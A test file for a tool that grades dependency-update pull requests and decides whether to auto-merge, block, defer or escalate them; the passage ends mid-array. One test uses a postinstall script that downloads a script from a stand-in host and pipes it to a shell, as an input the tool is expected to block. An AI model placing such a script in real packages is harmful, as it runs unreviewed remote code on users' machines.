import assert from "node:assert/strict";
import { test } from "node:test";

import type { z } from "zod";

import type { RepoPolicy } from "../forge/forge.ts";
import type { Bump } from "../recipes/dependabot-bump/bump.ts";

import { assess } from "./assess.ts";
import {
  assessmentInputSchema,
  type AssessmentInput,
  type GateId,
  type GateResult,
  type SafetyAssessment,
} from "./assessment.ts";
import { classifyUpdate } from "./classify.ts";
import type {
  AdvisoryEvidence,
  AnalysisEvidence,
  ChangesEvidence,
  ChecksEvidence,
  headCheckEvidenceSchema,
  LockfileChange,
  ModelFinding,
  PullRequestEvidence,
  RegistryEvidence,
  Tests,
  VersionInfo,
} from "./evidence.ts";
import { DEFAULT_POLICY, policyVersion } from "./policy.ts";

const HEAD = "1111111111111111111111111111111111111111";
const BASE = "2222222222222222222222222222222222222222";
const MERGE_BASE = "3333333333333333333333333333333333333333";
const EVALUATED_AT = "2026-10-22T12:00:00.000Z";
const DAY_MS = 86_400_000;

function daysBefore(days: number): string {
  return new Date(Date.parse(EVALUATED_AT) - days * DAY_MS).toISOString();
}

type HeadCheck = z.infer<typeof headCheckEvidenceSchema>;

interface FixtureOptions {
  name?: string;
  from?: string;
  to?: string;
}

/** Mutable handles into one assessment input, so each test changes only what it's about. */
interface Fixture {
  input: AssessmentInput;
  name: string;
  bump: Bump;
  pullRequest: PullRequestEvidence;
  changes: ChangesEvidence;
  lockfile: LockfileChange;
  registry: RegistryEvidence;
  from: VersionInfo;
  to: VersionInfo;
  advisories: AdvisoryEvidence;
  repoPolicy: RepoPolicy;
  checks: ChecksEvidence;
  tests: Tests;
  analysis: AnalysisEvidence;
  headCheck: HeadCheck;
}

function meta(id: string, source: string, sha: string | null) {
  return { id, source, collectedAt: EVALUATED_AT, sha };
}

function versionInfo(version: string, publishedAt: string, integrity: string): VersionInfo {
  return {
    version,
    publishedAt,
    integrity,
    tarball: null,
    installScripts: {},
    gypfile: false,
    dependencies: {},
    optionalDependencies: {},
    peerDependencies: { eslint: ">=9" },
    optionalPeers: [],
    engines: { node: ">=18" },
    publisher: "alice",
    maintainers: ["alice", "bob"],
    provenance: true,
    deprecated: null,
  };
}

/**
 * A grade-A bundle: Renovate on GitHub bumps an isolated pnpm devDependency by a patch released ten
 * days ago; the required `test` check passed on the head, the repository rules are clean, and the
 * model found nothing relevant in the release notes.
 */
function safeFixture(options: FixtureOptions = {}): Fixture {
  const name = options.name ?? "eslint-plugin-foo";
  const fromVersion = options.from ?? "1.2.3";
  const toVersion = options.to ?? "1.2.4";

  const bump: Bump = {
    package: name,
    from: fromVersion,
    to: toVersion,
    directory: null,
    level: "patch",
  };

  const pullRequest: PullRequestEvidence = {
    forge: "github",
    host: "github.com",
    project: "octo/app",
    number: 7,
    url: "https://github.com/octo/app/pull/7",
    title: `chore(deps): update dependency ${name} to v${toVersion}`,
    bump,
    updateCount: 1,
    author: { login: "renovate[bot]", isBot: true, trustedBot: true },
    state: "OPEN",
    isDraft: false,
    headSha: HEAD,
    baseRef: "main",
    baseSha: BASE,
    commits: [
      { sha: HEAD, authorLogin: "renovate[bot]", committerLogin: "web-flow", verified: true },
    ],
    createdAt: daysBefore(1),
    mergedAt: null,
  };

  const lockfile: LockfileChange = {
    path: "pnpm-lock.yaml",
    format: "pnpm",
    lockfileVersion: "9.0",
    added: [
      { name, version: toVersion, integrity: "sha512-to", resolved: null, hasInstallScript: null },
    ],
    removed: [
      {
        name,
        version: fromVersion,
        integrity: "sha512-from",
        resolved: null,
        hasInstallScript: null,
      },
    ],
    integrityChanged: [],
  };

  const changes: ChangesEvidence = {
    mergeBaseSha: MERGE_BASE,
    headSha: HEAD,
    files: [
      { path: "package.json", status: "modified", previousPath: null },
      { path: "pnpm-lock.yaml", status: "modified", previousPath: null },
    ],
    manifests: [
      {
        path: "package.json",
        dependencyChanges: [
          { name, type: "devDependency", from: `^${fromVersion}`, to: `^${toVersion}` },
        ],
        otherChanges: [],
      },
    ],
    lockfiles: [lockfile],
    importers: [
      {
        path: ".",
        dependencies: [
          { name, type: "devDependency", specifier: `^${toVersion}`, version: toVersion },
          { name: "eslint", type: "devDependency", specifier: "^9.0.0", version: "9.1.0" },
        ],
      },
    ],
    projectNodeEngine: ">=22",
  };

  const from = versionInfo(fromVersion, daysBefore(60), "sha512-from");
  const to = versionInfo(toVersion, daysBefore(10), "sha512-to");

  const registry: RegistryEvidence = {
    registry: "https://registry.npmjs.org",
    package: name,
    from,
    to,
    previousRelease: { version: fromVersion, publishedAt: daysBefore(60) },
    transitive: [],
    transitiveComplete: true,
  };

  const advisories: AdvisoryEvidence = { checked: [`${name}@${toVersion}`], advisories: [] };

  const repoPolicy: RepoPolicy = {
    baseRef: "main",
    reviewDecision: "NONE",
    mergeStateStatus: "CLEAN",
    mergeQueueRequired: false,
    requiredChecks: ["test"],
  };

  const checks: ChecksEvidence = {
    sha: HEAD,
    status: "settled",
    checks: [{ name: "test", state: "pass" }],
  };

  const tests: Tests = { status: "passed", command: "pnpm test", log: "" };

  const analysis: AnalysisEvidence = {
    model: "small-model",
    findings: [
      {
        category: "release-behavior",
        component: name,
        criterion: "release.no-relevant-change",
        evidenceRef: "release-notes",
        explanation: "only fixes a false positive in one rule",
      },
    ],
  };

  const headCheck: HeadCheck = { headSha: HEAD, baseRef: "main", state: "OPEN" };

  const input: AssessmentInput = {
    evidence: {
      pullRequest: { ...meta("pull-request", "github api", HEAD), status: "ok", data: pullRequest },
      changes: { ...meta("changes", "git", HEAD), status: "ok", data: changes },
      registry: {
        ...meta("registry", "https://registry.npmjs.org", null),
        status: "ok",
        data: registry,
      },
      advisories: { ...meta("advisories", "npm audit", null), status: "ok", data: advisories },
      repoPolicy: { ...meta("repo-policy", "github api", null), status: "ok", data: repoPolicy },
      checks: { ...meta("checks", "github api", HEAD), status: "ok", data: checks },
      localTests: { ...meta("local-tests", "sandbox", HEAD), status: "ok", data: tests },
      artifacts: {
        ...meta("artifacts", "sandbox", null),
        status: "not-collected",
        reason: "policy.verification.artifacts is off",
      },
      releaseNotes: {
        ...meta("release-notes", "pr body", null),
        status: "ok",
        data: {
          origin: "pr body",
          digest: "sha256:notes",
          text: "### Bug Fixes\n- no false positive",
        },
      },
      analysis: { ...meta("analysis", "model", null), status: "ok", data: analysis },
      headCheck: { ...meta("head-check", "github api", null), status: "ok", data: headCheck },
    },
    policy: structuredClone(DEFAULT_POLICY),
    evaluatedAt: EVALUATED_AT,
  };

  return {
    input,
    name,
    bump,
    pullRequest,
    changes,
    lockfile,
    registry,
    from,
    to,
    advisories,
    repoPolicy,
    checks,
    tests,
    analysis,
    headCheck,
  };
}

function missingItem(
  id: string,
  status: "error" | "unavailable" | "not-collected",
  reason: string,
) {
  return { ...meta(id, "test", null), status, reason };
}

function gate(assessment: SafetyAssessment, id: GateId): GateResult {
  const found = assessment.gates.find((result) => result.gate === id);

  assert.ok(found, `gate ${id} is reported`);

  return found;
}

function criteria(assessment: SafetyAssessment): string[] {
  return assessment.findings.map((finding) => finding.criterion);
}

/**
 * Adds a transitive package with clean registry and advisory data. It declares `declares` (name →
 * range); the new version of the updated package doesn't declare it unless a test says so.
 */
function addTransitive(
  fixture: Fixture,
  name: string,
  declares: Record<string, string> = {},
): void {
  fixture.lockfile.added.push({
    name,
    version: "1.0.0",
    integrity: `sha512-${name}`,
    resolved: null,
    hasInstallScript: false,
  });
  fixture.registry.transitive.push({
    name,
    version: "1.0.0",
    installScripts: {},
    gypfile: false,
    integrity: `sha512-${name}`,
    dependencies: declares,
    optionalDependencies: {},
    replaced: [],
  });
  fixture.advisories.checked.push(`${name}@1.0.0`);
}

function modelFinding(fixture: Fixture, overrides: Partial<ModelFinding>): ModelFinding {
  return {
    category: "release-behavior",
    component: fixture.name,
    criterion: "release.behavior-change",
    evidenceRef: "release-notes",
    explanation: "the rule now reports unused directives",
    ...overrides,
  };
}

test("the fixture is a valid assessment input", () => {
  assert.ok(assessmentInputSchema.safeParse(safeFixture().input).success);
});

test("a safe patch bump to an isolated devDependency would auto-merge, but observe mode doesn't", () => {
  const fixture = safeFixture();
  const assessment = assess(fixture.input);

  assert.equal(assessment.eligible, true);
  assert.equal(assessment.decision, "AUTO_MERGE");
  assert.equal(assessment.grade, "A");
  assert.equal(assessment.score, 100);
  assert.deepEqual(assessment.deductions, []);
  assert.deepEqual(assessment.missingEvidence, []);
  assert.ok(assessment.gates.every((result) => result.status === "PASS"));
  assert.deepEqual(
    assessment.gates.map((result) => result.gate),
    [
      "identity",
      "change-scope",
      "dependency-integrity",
      "security",
      "install-behavior",
      "release-maturity",
      "compatibility",
      "ci",
      "repository-policy",
      "evidence-currency",
    ],
  );
  assert.deepEqual(criteria(assessment), [
    "impact.isolated",
    "graph.expected",
    "release.no-relevant-change",
    "compatibility.compatible",
    "verification.checks-pass",
    "history.established",
  ]);
  assert.deepEqual(
    assessment.findings.map((finding) => finding.id),
    ["f1", "f2", "f3", "f4", "f5", "f6"],
  );
  assert.equal(assessment.findings[2]?.source, "model:small-model");
  assert.equal(assessment.authorization.mode, "observe");
  assert.equal(assessment.authorization.permitted, false);
  assert.ok(assessment.authorization.reasons.some((reason) => reason.includes("observation mode")));
  assert.equal(assessment.policyVersion, policyVersion(fixture.input.policy));
  assert.equal(assessment.rubricVersion, "1.0");
  assert.match(assessment.explanation[0] ?? "", /^AUTO_MERGE: every gate passed/);
});

test("an autonomous policy that allows merging permits the merge", () => {
  const fixture = safeFixture();

  fixture.input.policy.mode = "autonomous";
  fixture.input.policy.automation.merge = true;

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "AUTO_MERGE");
  assert.equal(assessment.authorization.permitted, true);
  assert.equal(assessment.authorization.approve, false);
  assert.deepEqual(assessment.authorization.reasons, []);
});

test("minor and major updates are ineligible, not unsafe", () => {
  for (const [to, updateType] of [
    ["1.3.0", "minor"],
    ["2.0.0", "major"],
  ] as const) {
    const assessment = assess(safeFixture({ to }).input);

    assert.equal(assessment.updateClassification.updateType, updateType);
    assert.equal(assessment.eligible, false);
    assert.ok(assessment.eligibilityReasons.includes(`${updateType} updates are not eligible`));
    assert.equal(assessment.decision, "HUMAN_REVIEW");
    assert.deepEqual(assessment.gates, []);
    assert.equal(assessment.score, null);
    assert.equal(assessment.grade, null);
    assert.equal(assessment.stages.find((stage) => stage.stage === "gates")?.status, "skipped");
    assert.equal(assessment.stages.find((stage) => stage.stage === "rubric")?.status, "skipped");
    assert.match(assessment.explanation[0] ?? "", /ineligible, not unsafe/);
  }
});

test("a stable 0.x patch is a plain patch flagged zeroMajor, and ineligible", () => {
  const assessment = assess(safeFixture({ from: "0.4.1", to: "0.4.2" }).input);

  assert.equal(assessment.updateClassification.updateType, "patch");
  assert.equal(assessment.updateClassification.zeroMajor, true);
  assert.deepEqual(assessment.eligibilityReasons, ["0.x versions are not eligible"]);
  assert.equal(assessment.decision, "HUMAN_REVIEW");
  assert.equal(assessment.score, null);
});

test("a grouped update is ineligible", () => {
  const fixture = safeFixture();

  fixture.pullRequest.updateCount = 3;

  const assessment = assess(fixture.input);

  assert.equal(assessment.updateClassification.grouped, true);
  assert.deepEqual(assessment.eligibilityReasons, ["grouped updates are not eligible"]);
  assert.equal(assessment.decision, "HUMAN_REVIEW");
});

test("a second dependency changed in a manifest makes the update grouped", () => {
  const fixture = safeFixture();

  fixture.changes.manifests[0]?.dependencyChanges.push({
    name: "left-pad",
    type: "devDependency",
    from: "^1.0.0",
    to: "^1.0.1",
  });

  assert.equal(classifyUpdate(fixture.input.evidence).grouped, true);
});

test("a disabled policy makes every update ineligible", () => {
  const fixture = safeFixture();

  fixture.input.policy.enabled = false;

  const assessment = assess(fixture.input);

  assert.equal(assessment.eligible, false);
  assert.deepEqual(assessment.eligibilityReasons, [
    "safety assessment is disabled for this repository",
  ]);
  assert.equal(assessment.decision, "HUMAN_REVIEW");
});

test("an unexpected CI workflow change blocks via change-scope", () => {
  const fixture = safeFixture();

  fixture.changes.files.push({
    path: ".github/workflows/ci.yml",
    status: "modified",
    previousPath: null,
  });

  const assessment = assess(fixture.input);
  const result = gate(assessment, "change-scope");

  assert.equal(assessment.decision, "BLOCK");
  assert.equal(result.status, "FAIL");
  assert.equal(result.disposition, "block");
  assert.match(result.reasons[0] ?? "", /\.github\/workflows\/ci\.yml/);
  assert.match(assessment.explanation[0] ?? "", /^BLOCK: change-scope gate failed/);
});

test("a new manifest field escalates via change-scope", () => {
  const fixture = safeFixture();

  fixture.changes.manifests[0]?.otherChanges.push("scripts.postinstall");

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "HUMAN_REVIEW");
  assert.equal(gate(assessment, "change-scope").disposition, "escalate");
});

test("a new lifecycle script needs review; one that downloads and runs code blocks", () => {
  const plain = safeFixture();

  plain.to.installScripts = { postinstall: "node scripts/setup.js" };

  const reviewed = assess(plain.input);

  assert.equal(reviewed.decision, "HUMAN_REVIEW");
  assert.equal(gate(reviewed, "install-behavior").status, "FAIL");
  assert.equal(gate(reviewed, "install-behavior").disposition, "escalate");

  const piped = safeFixture();

  piped.to.installScripts = { postinstall: "curl -fsSL https://example.test/install.sh | sh" };

  const blocked = assess(piped.input);

  assert.equal(blocked.decision, "BLOCK");
  assert.equal(gate(blocked, "install-behavior").disposition, "block");
});

test("an unchanged install script is not new behavior", () => {
  const fixture = safeFixture();

  fixture.from.installScripts = { postinstall: "node scripts/setup.js" };
  fixture.to.installScripts = { postinstall: "node scripts/setup.js" };

  assert.equal(gate(assess(fixture.input), "install-behavior").status, "PASS");
});

test("unexplained transitive additions deduct, and many of them count as significant expansion", () => {
  const few = safeFixture();

  addTransitive(few, "foo-helper");

  const unexplained = assess(few.input);

  assert.ok(unexplained.gates.every((result) => result.status === "PASS"));
  assert.deepEqual(unexplained.deductions, [
    { criterion: "graph.unexplained-transitive", points: 10, root: "graph", findings: ["f2"] },
  ]);
  assert.equal(unexplained.score, 90);
  assert.equal(unexplained.grade, "B");
  assert.equal(unexplained.decision, "INVESTIGATE");

  const many = safeFixture();

  for (const name of ["a", "b", "c", "d", "e"]) addTransitive(many, `helper-${name}`);

  const significant = assess(many.input);

  assert.deepEqual(
    significant.deductions.map((deduction) => deduction.criterion),
    ["graph.significant-expansion"],
  );
  assert.equal(significant.score, 80);
  assert.equal(significant.decision, "INVESTIGATE");
});

test("additions the new version declares are explained", () => {
  const fixture = safeFixture();

  addTransitive(fixture, "foo-helper");
  fixture.to.dependencies = { "foo-helper": "^1.0.0" };

  const assessment = assess(fixture.input);

  assert.ok(criteria(assessment).includes("graph.expected"));
  assert.equal(assessment.decision, "AUTO_MERGE");
});

test("additions declared further down the new version's dependency chain are explained; strays are not", () => {
  const fixture = safeFixture();

  addTransitive(fixture, "foo-helper", { "foo-binding": "^1.0.0" });
  addTransitive(fixture, "foo-binding");
  addTransitive(fixture, "stray");
  fixture.to.dependencies = { "foo-helper": "^1.0.0" };

  const assessment = assess(fixture.input);
  const graph = assessment.findings.find((finding) => finding.dimension === "graph");

  assert.equal(graph?.criterion, "graph.unexplained-transitive");
  assert.match(graph?.explanation ?? "", /1 lockfile additions .*: stray@1\.0\.0$/);
});

test("a declared range the added version doesn't satisfy explains nothing", () => {
  const fixture = safeFixture();

  addTransitive(fixture, "foo-helper", { "foo-binding": "^2.0.0" });
  addTransitive(fixture, "foo-binding");
  fixture.to.dependencies = { "foo-helper": "^1.0.0" };

  const graph = assess(fixture.input).findings.find((finding) => finding.dimension === "graph");

  assert.match(graph?.explanation ?? "", /foo-binding@1\.0\.0/);
});

test("a dependency re-resolved inside an unchanged range is explained, and so is what it declares", () => {
  const fixture = safeFixture();

  addTransitive(fixture, "foo-core", { "foo-core-darwin-arm64": "1.0.0" });
  addTransitive(fixture, "foo-core-darwin-arm64");
  fixture.from.dependencies = { "foo-core": "^1.0.0" };
  fixture.to.dependencies = { "foo-core": "^1.0.0" };

  const assessment = assess(fixture.input);

  assert.ok(criteria(assessment).includes("graph.expected"));
  assert.equal(assessment.decision, "AUTO_MERGE");
});

test("a transitive install script is new only if the version it replaces didn't run the same one", () => {
  const addInstaller = (fixture: Fixture, previous: Record<string, string>): void => {
    addTransitive(fixture, "foo-core");
    fixture.to.dependencies = { "foo-core": "^1.0.0" };

    const [lockedEntry] = fixture.lockfile.added.slice(-1);
    const [registryEntry] = fixture.registry.transitive.slice(-1);

    if (lockedEntry === undefined || registryEntry === undefined) throw new Error("no transitive");

    lockedEntry.hasInstallScript = true;
    registryEntry.installScripts = { postinstall: "node postinstall.js" };
    registryEntry.replaced = [{ version: "0.9.0", installScripts: previous, gypfile: false }];
    fixture.lockfile.removed.push({
      name: "foo-core",
      version: "0.9.0",
      integrity: "sha512-foo-core-0.9.0",
      resolved: null,
      hasInstallScript: Object.keys(previous).length > 0,
    });
  };

  const unchanged = safeFixture();

  addInstaller(unchanged, { postinstall: "node postinstall.js" });
  assert.equal(gate(assess(unchanged.input), "install-behavior").status, "PASS");

  const changed = safeFixture();

  addInstaller(changed, { postinstall: "node old-postinstall.js" });
  assert.equal(gate(assess(changed.input), "install-behavior").status, "FAIL");

  const added = safeFixture();

  addInstaller(added, {});

  const reasons = gate(assess(added.input), "install-behavior").reasons;

  assert.ok(reasons.some((reason) => /adds foo-core@1\.0\.0, which runs code/.test(reason)));
  assert.ok(
    reasons.some((reason) => /adds foo-core@1\.0\.0, which has an install script/.test(reason)),
  );
});

test("missing release metadata is insufficient evidence, never a pass", () => {
  const fixture = safeFixture();

  fixture.input.evidence.registry = missingItem("registry", "error", "registry timed out");

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "INSUFFICIENT_EVIDENCE");
  assert.equal(assessment.score, null);
  assert.equal(assessment.grade, null);
  assert.ok(assessment.missingEvidence.includes("registry"));
  assert.equal(gate(assessment, "release-maturity").status, "INCONCLUSIVE");
  assert.equal(gate(assessment, "release-maturity").disposition, "insufficient-evidence");
  assert.equal(gate(assessment, "dependency-integrity").status, "INCONCLUSIVE");
});

test("a release younger than the minimum age defers until it matures", () => {
  const fixture = safeFixture();
  const publishedAt = daysBefore(1);

  fixture.to.publishedAt = publishedAt;

  const assessment = assess(fixture.input);
  const result = gate(assessment, "release-maturity");
  const retryAt = new Date(Date.parse(publishedAt) + 72 * 3_600_000).toISOString();

  assert.equal(assessment.decision, "DEFER");
  assert.equal(result.status, "FAIL");
  assert.equal(result.disposition, "defer");
  assert.equal(result.retryAt, retryAt);
  assert.equal(assessment.retryAt, retryAt);
});

test("failed CI needs review and pending CI defers", () => {
  const failed = safeFixture();

  failed.checks.checks = [{ name: "test", state: "fail" }];

  const failedAssessment = assess(failed.input);

  assert.equal(failedAssessment.decision, "HUMAN_REVIEW");
  assert.equal(gate(failedAssessment, "ci").status, "FAIL");
  assert.equal(gate(failedAssessment, "ci").disposition, "escalate");

  const pending = safeFixture();

  pending.checks.checks = [{ name: "test", state: "pending" }];

  const pendingAssessment = assess(pending.input);

  assert.equal(pendingAssessment.decision, "DEFER");
  assert.equal(gate(pendingAssessment, "ci").status, "INCONCLUSIVE");
  assert.equal(gate(pendingAssessment, "ci").disposition, "defer");
});

test("a required check that hasn't reported defers", () => {
  const fixture = safeFixture();

  fixture.checks.checks = [{ name: "lint", state: "pass" }];

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "DEFER");
  assert.match(gate(assessment, "ci").reasons[0] ?? "", /required check test has not reported/);
});

test("CI from another commit is stale: never a pass, never an auto-merge", () => {
  const fixture = safeFixture();
  const stale = "4444444444444444444444444444444444444444";

  fixture.checks.sha = stale;
  fixture.input.evidence.checks.sha = stale;

  const assessment = assess(fixture.input);

  assert.notEqual(gate(assessment, "ci").status, "PASS");
  assert.equal(gate(assessment, "evidence-currency").status, "FAIL");
  assert.notEqual(assessment.decision, "AUTO_MERGE");
});

test("failing local tests need review; a repo without tests only deducts", () => {
  const failing = safeFixture();

  failing.tests.status = "failed";

  assert.equal(gate(assess(failing.input), "ci").disposition, "escalate");

  const untested = safeFixture();

  untested.tests.status = "no-tests";

  const assessment = assess(untested.input);

  assert.equal(gate(assessment, "ci").status, "PASS");
  assert.deepEqual(
    assessment.deductions.map((deduction) => deduction.criterion),
    ["verification.inadequately-tested"],
  );
  assert.equal(assessment.decision, "INVESTIGATE");
});

test("incomplete security evidence is insufficient evidence", () => {
  const fixture = safeFixture();

  fixture.input.evidence.advisories = missingItem("advisories", "error", "npm audit failed");

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "INSUFFICIENT_EVIDENCE");
  assert.equal(gate(assessment, "security").status, "INCONCLUSIVE");
  assert.ok(assessment.missingEvidence.includes("advisories"));
  assert.equal(assessment.score, null);
});

test("an unchecked added package leaves the security gate inconclusive", () => {
  const fixture = safeFixture();

  fixture.advisories.checked = [];

  const assessment = assess(fixture.input);

  assert.equal(gate(assessment, "security").status, "INCONCLUSIVE");
  assert.equal(assessment.decision, "INSUFFICIENT_EVIDENCE");
});

test("a known compromised dependency blocks", () => {
  const fixture = safeFixture();

  fixture.advisories.advisories.push({
    id: "GHSA-mal-ware-0001",
    source: "github malware",
    package: fixture.name,
    version: "1.2.4",
    severity: "critical",
    kind: "malware",
    title: "Malicious code in eslint-plugin-foo",
    url: null,
  });

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "BLOCK");
  assert.equal(gate(assessment, "security").disposition, "block");
  assert.match(
    assessment.explanation[0] ?? "",
    /^BLOCK: security gate failed: malware advisory GHSA-mal-ware-0001/,
  );
  assert.equal(assessment.score, 100, "the score is still reported when evidence is complete");
});

test("a release deprecated as compromised blocks", () => {
  const fixture = safeFixture();

  fixture.to.deprecated = "This version was compromised; use 1.2.5";

  assert.equal(assess(fixture.input).decision, "BLOCK");
});

test("a disallowed vulnerability needs review", () => {
  const fixture = safeFixture();

  fixture.advisories.advisories.push({
    id: "GHSA-vuln-0001",
    source: "npm audit",
    package: fixture.name,
    version: "1.2.4",
    severity: "high",
    kind: "vulnerability",
    title: "ReDoS",
    url: null,
  });

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "HUMAN_REVIEW");
  assert.equal(gate(assessment, "security").disposition, "escalate");
});

test("a grade below the merge threshold investigates instead of merging", () => {
  const critical = assess(safeFixture({ name: "typescript" }).input);

  assert.ok(criteria(critical).includes("impact.build-critical"));
  assert.equal(critical.score, 90);
  assert.equal(critical.grade, "B");
  assert.equal(critical.decision, "INVESTIGATE");

  const fixture = safeFixture();

  fixture.input.policy.grading.autonomousMergeMinimumScore = 100;
  fixture.input.evidence.releaseNotes = missingItem(
    "release-notes",
    "unavailable",
    "no changelog found",
  );
  fixture.input.evidence.analysis = missingItem("analysis", "not-collected", "no release notes");

  const belowMinimum = assess(fixture.input);

  assert.deepEqual(
    belowMinimum.deductions.map((deduction) => [deduction.criterion, deduction.points]),
    [["release.notes-unavailable", 5]],
  );
  assert.equal(belowMinimum.score, 95);
  assert.equal(belowMinimum.grade, "A");
  assert.equal(belowMinimum.decision, "INVESTIGATE");
});

test("a PR head that moved during evaluation defers via evidence-currency", () => {
  const fixture = safeFixture();

  fixture.headCheck.headSha = "5555555555555555555555555555555555555555";

  const assessment = assess(fixture.input);
  const result = gate(assessment, "evidence-currency");

  assert.equal(assessment.decision, "DEFER");
  assert.equal(result.status, "FAIL");
  assert.equal(result.disposition, "defer");
  assert.deepEqual(result.reasons, ["PR changed during evaluation; re-evaluate"]);
});

test("a PR closed during evaluation needs review", () => {
  const fixture = safeFixture();

  fixture.headCheck.state = "CLOSED";

  assert.equal(gate(assess(fixture.input), "evidence-currency").disposition, "escalate");
});

test("a required review without automation.approve, or a merge queue, needs a human", () => {
  const review = safeFixture();

  review.repoPolicy.reviewDecision = "REVIEW_REQUIRED";

  const reviewAssessment = assess(review.input);

  assert.equal(reviewAssessment.decision, "HUMAN_REVIEW");
  assert.deepEqual(gate(reviewAssessment, "repository-policy").reasons, [
    "needs an approving review and automation.approve is off",
  ]);

  const queue = safeFixture();

  queue.repoPolicy.mergeQueueRequired = true;

  const queueAssessment = assess(queue.input);

  assert.equal(queueAssessment.decision, "HUMAN_REVIEW");
  assert.deepEqual(gate(queueAssessment, "repository-policy").reasons, [
    "merge queue required; the kitchen does not enqueue",
  ]);
});

test("a required review with approval allowed can be approved and merged", () => {
  const fixture = safeFixture();

  fixture.repoPolicy.reviewDecision = "REVIEW_REQUIRED";
  fixture.input.policy.mode = "autonomous";
  fixture.input.policy.automation = { approve: true, merge: true, mergeMethod: "squash" };

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "AUTO_MERGE");
  assert.equal(assessment.authorization.permitted, true);
  assert.equal(assessment.authorization.approve, true);
});

test("an unknown review state is inconclusive", () => {
  const fixture = safeFixture();

  fixture.repoPolicy.reviewDecision = null;

  const assessment = assess(fixture.input);

  assert.equal(gate(assessment, "repository-policy").status, "INCONCLUSIVE");
  assert.equal(assessment.decision, "INSUFFICIENT_EVIDENCE");
});

test("a PR behind its base defers", () => {
  const fixture = safeFixture();

  fixture.repoPolicy.mergeStateStatus = "BEHIND";

  assert.equal(assess(fixture.input).decision, "DEFER");
});

test("a foreign commit author needs review via identity", () => {
  const fixture = safeFixture();

  fixture.pullRequest.commits.push({
    sha: "6666",
    authorLogin: "mallory",
    committerLogin: "mallory",
    verified: false,
  });

  const assessment = assess(fixture.input);

  assert.equal(assessment.decision, "HUMAN_REVIEW");
  assert.equal(gate(assessment, "identity").disposition, "escalate");
});

test("the same model finding twice deducts once; findings from the same notes deduct only the largest", () => {
  const duplicated = safeFixture();
  const behaviorChange = modelFinding(duplicated, {});

  duplicated.analysis.findings = [behaviorChange, { ...behaviorChange }];

  const once = assess(duplicated.input);

  assert.deepEqual(once.deductions, [
    {
      criterion: "release.behavior-change",
      points: 15,
      root: "model:release-notes",
      findings: ["f3"],
    },
  ]);
  assert.equal(once.score, 85);

  const shared = safeFixture();

  shared.analysis.findings = [
    modelFinding(shared, {}),
    modelFinding(shared, {
      category: "compatibility",
      criterion: "compatibility.api-or-config",
      explanation: "the rule's options were renamed",
    }),
  ];

  const largest = assess(shared.input);

  const fromNotes = largest.deductions.filter(
    (deduction) => deduction.root === "model:release-notes",
  );

  assert.equal(fromNotes.length, 1);
  assert.equal(fromNotes[0]?.criterion, "compatibility.api-or-config");
  assert.equal(fromNotes[0]?.points, 20);
  assert.equal(fromNotes[0]?.findings.length, 2);
  assert.equal(largest.score, 80);
  assert.equal(largest.decision, "INVESTIGATE");
});

test("an inconclusive model analysis is rejected and leaves evidence missing", () => {
  const fixture = safeFixture();

  fixture.analysis.findings = [
    modelFinding(fixture, { criterion: "inconclusive", explanation: "notes are empty" }),
  ];

  const assessment = assess(fixture.input);

  assert.equal(assessment.rejectedFindings.length, 1);
  assert.match(assessment.rejectedFindings[0]?.reason ?? "", /could not tell/);
  assert.ok(assessment.missingEvidence.includes("analysis"));
  assert.equal(assessment.decision, "INSUFFICIENT_EVIDENCE");
  assert.equal(assessment.score, null);
});

test("model findings citing missing evidence, a foreign criterion, or another package are rejected", () => {
  const fixture = safeFixture();

  fixture.analysis.findings.push(
    modelFinding(fixture, { evidenceRef: "changelog" }),
    modelFinding(fixture, { criterion: "history.maintainer-change" }),
    modelFinding(fixture, { category: "compatibility", criterion: "release.behavior-change" }),
    modelFinding(fixture, { component: "left-pad" }),
  );

  const assessment = assess(fixture.input);

  assert.deepEqual(
    assessment.rejectedFindings.map((rejected) => rejected.reason),
    [
      "it cites changelog, which is not collected evidence",
      "history.maintainer-change is not a release-behavior criterion",
      "release.behavior-change is not a compatibility criterion",
      "it is about left-pad, not eslint-plugin-foo",
    ],
  );
  assert.deepEqual(assessment.deductions, []);
  assert.equal(assessment.score, 100);
  assert.equal(assessment.decision, "AUTO_MERGE");
});

test("a criterion outside the rubric can't reach the evaluator", () => {
  const fixture = safeFixture();
  const raw = JSON.parse(JSON.stringify(fixture.input));

  raw.evidence.analysis.data.findings[0].criterion = "release.totally-fine";

  assert.equal(assessmentInputSchema.safeParse(raw).success, false);
});

test("lockfile integrity that disagrees with the registry blocks", () => {
  const fixture = safeFixture();
  const proposed = fixture.lockfile.added[0];

  assert.ok(proposed);
  proposed.integrity = "sha512-tampered";

  const assessment = assess(fixture.input);
  const result = gate(assessment, "dependency-integrity");

  assert.equal(assessment.decision, "BLOCK");
  assert.equal(result.disposition, "block");
  assert.match(result.reasons[0] ?? "", /conflicting sources/);
});

test("a PR title version the lockfile doesn't match needs review", () => {
  const fixture = safeFixture();
  const proposed = fixture.lockfile.added[0];
  const manifestChange = fixture.changes.manifests[0]?.dependencyChanges[0];

  assert.ok(proposed && manifestChange);
  proposed.version = "1.2.5";
  manifestChange.to = "^1.2.5";

  const assessment = assess(fixture.input);
  const result = gate(assessment, "dependency-integrity");

  assert.equal(assessment.decision, "HUMAN_REVIEW");
  assert.equal(result.status, "FAIL");
  assert.equal(result.disposition, "escalate");
  assert.ok(
    result.reasons.some((reason) =>
      /doesn't add eslint-plugin-foo@1\.2\.4.*it adds 1\.2\.5/.test(reason),
    ),
  );
});

test("a lockfile that rewrites already-locked bytes blocks", () => {
  const fixture = safeFixture();

  fixture.lockfile.integrityChanged.push({
    name: "eslint",
    version: "9.1.0",
    before: "sha512-a",
    after: "sha512-b",
  });

  assert.equal(assess(fixture.input).decision, "BLOCK");
});

/** Each adds one deterministic penalty finding to an otherwise safe fixture. */
const PENALTIES: ReadonlyArray<[string, (fixture: Fixture) => void]> = [
  ["production-runtime", (fixture) => (fixture.input.policy.impact.isolated = [])],
  ["unexplained-transitive", (fixture) => addTransitive(fixture, "foo-helper")],
  [
    "notes-unavailable",
    (fixture) => {
      fixture.input.evidence.releaseNotes = missingItem(
        "release-notes",
        "unavailable",
        "no changelog",
      );
      fixture.input.evidence.analysis = missingItem(
        "analysis",
        "not-collected",
        "no release notes",
      );
    },
